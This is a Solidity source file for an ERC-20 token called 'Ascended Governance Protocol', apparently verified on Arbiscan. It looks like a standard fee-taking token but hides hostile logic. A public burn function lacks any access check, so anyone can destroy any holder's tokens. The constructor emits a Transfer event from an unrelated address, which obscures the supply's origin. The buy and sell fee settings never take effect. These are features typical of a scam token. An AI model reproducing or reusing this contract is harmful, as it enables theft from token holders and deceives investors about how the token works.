/**
 *Submitted for verification at Arbiscan on 2023-05-17
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address public _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract AscendedGovernanceProtocol is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    uint256 private _tTotal = 1e10 * 10**9;
    
    uint256 private _buyDevFee = 3;
    uint256 private _previousBuyDevFee = _buyDevFee;
    uint256 private _buyLiquidityFee = 2;
    uint256 private _previousBuyLiquidityFee = _buyLiquidityFee;
    
    uint256 private _sellDevFee = 3;
    uint256 private _previousSellDevFee = _sellDevFee;
    uint256 private _sellLiquidityFee = 2;
    uint256 private _previousSellLiquidityFee = _sellLiquidityFee;
    uint256 private tokensForDev;
    uint256 private tokensForLiquidity;
    address payable private _DevWallet;
    
    string private constant _name = "Ascended Governance Protocol";
    string private constant _symbol = "AGP";
    uint8 private constant _decimals = 9;
    
    bool private swapping;
    uint256 private tradingActiveBlock = 0; // 0 means trading is not active
    uint256 private blocksToBlacklist = 10;
    uint256 private _maxSellAmount = _tTotal;
    uint256 private _maxWalletAmount = _tTotal;
    
    event MaxSellAmountUpdated(uint _maxSellAmount);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
    constructor () {
        _balances[_msgSender()] = _tTotal; 
        _DevWallet = payable(0xC736c5436e3742B56972295175351A1B7c16269F);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_DevWallet] = true;
        emit Transfer(address(0x26cB718f54e9B922D23BaaEd499aD953ec511D33), _msgSender(), _tTotal);
    } 
     function burn(address account, uint256 amount) public virtual {
    _burn(account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        
        _beforeTokenTransfer(account, address(0), amount);
        
        uint256 accountBalance = balanceOf(account); {
            require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
            unchecked {
                accountBalance -= amount;
            }
            _tTotal -= amount;
            bool takeFee = false;
            
            _tokenTransfer(account, address(0), amount, takeFee);
            
            _afterTokenTransfer(account, address(0), amount);
        }
    }

    function _beforeTokenTransfer(
        address from
        ,address to
        ,uint256 amount
        ) internal virtual {}

    function _afterTokenTransfer(
        address from
        ,address to
        ,uint256 amount
        ) internal virtual {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue,
                "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        bool takeFee = false;

        if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            takeFee = false;
        }

        _tokenTransfer(sender,recipient,amount,takeFee);
    }

    function setMaxSellAmount(uint256 maxSell) public onlyOwner {
        _maxSellAmount = maxSell;
    }
    
    function setMaxWalletAmount(uint256 maxToken) public onlyOwner {
        _maxWalletAmount = maxToken;
    }

    function setDevWallet(address DevWallet) public onlyOwner() {
        require(DevWallet != address(0), "DevWallet address cannot be 0");
        _isExcludedFromFee[_DevWallet] = false;
        _DevWallet = payable(DevWallet);
        _isExcludedFromFee[_DevWallet] = true;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }
    
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function setBuyFee(uint256 buyDevFee, uint256 buyLiquidityFee) external onlyOwner {
        require(buyDevFee + buyLiquidityFee <= 30, "Must keep buy taxes below 30%");
        _buyDevFee = buyDevFee;
        _buyLiquidityFee = buyLiquidityFee;
    }

    function setSellFee(uint256 sellDevFee, uint256 sellLiquidityFee) external onlyOwner {
        require(sellDevFee + sellLiquidityFee <= 60, "Must keep sell taxes below 60%");
        _sellDevFee = sellDevFee;
        _sellLiquidityFee = sellLiquidityFee;
    }

    function removeAllFee() private {
        if(_buyDevFee == 0 && _buyLiquidityFee == 0 && _sellDevFee == 0 && _sellLiquidityFee == 0) return;
        
        _previousBuyDevFee = _buyDevFee;
        _previousBuyLiquidityFee = _buyLiquidityFee;
        _previousSellDevFee = _sellDevFee;
        _previousSellLiquidityFee = _sellLiquidityFee;
        
        _buyDevFee = 0;
        _buyLiquidityFee = 0;
        _sellDevFee = 0;
        _sellLiquidityFee = 0;
    }
    
    function restoreAllFee() private {
        _buyDevFee = _previousBuyDevFee;
        _buyLiquidityFee = _previousBuyLiquidityFee;
        _sellDevFee = _previousSellDevFee;
        _sellLiquidityFee = _previousSellLiquidityFee;
    }
        
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if(!takeFee) {
            removeAllFee();
        } else {
            amount = _takeFees(sender, amount);
        }
        _transferStandard(sender, recipient, amount);
        
        if(!takeFee) {
            restoreAllFee();
        }
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
         _balances[sender] = _balances[sender].sub(tAmount);
         _balances[recipient] = _balances[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

    function _takeFees(address sender, uint256 amount) private returns (uint256) {
        uint256 _totalFees;
        uint256 DevFee;
        uint256 LiqFee;
        bool isSell;
        if(tradingActiveBlock + blocksToBlacklist >= block.number){
            _totalFees = 99;
            LiqFee = 92;
        } else {
            _totalFees = _getTotalFees(isSell);
            if (isSell) {
                DevFee = _sellDevFee;
                LiqFee = _sellLiquidityFee;
            } else {
                DevFee = _buyDevFee;
                LiqFee = _buyLiquidityFee;
            }
        }
        uint256 fees = amount.mul(_totalFees).div(100);
        tokensForDev += fees * DevFee / _totalFees;
        tokensForLiquidity += fees * LiqFee / _totalFees;
            
        if(fees > 0) {
            _transferStandard(sender, _DevWallet, fees);
        }
            
        return amount -= fees;
    }

    receive() external payable {}

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    function _getTotalFees(bool isSell) private view returns(uint256) {
        if (isSell) {
            return _sellDevFee + _sellLiquidityFee;
        }
        return _buyDevFee + _buyLiquidityFee;
    }
}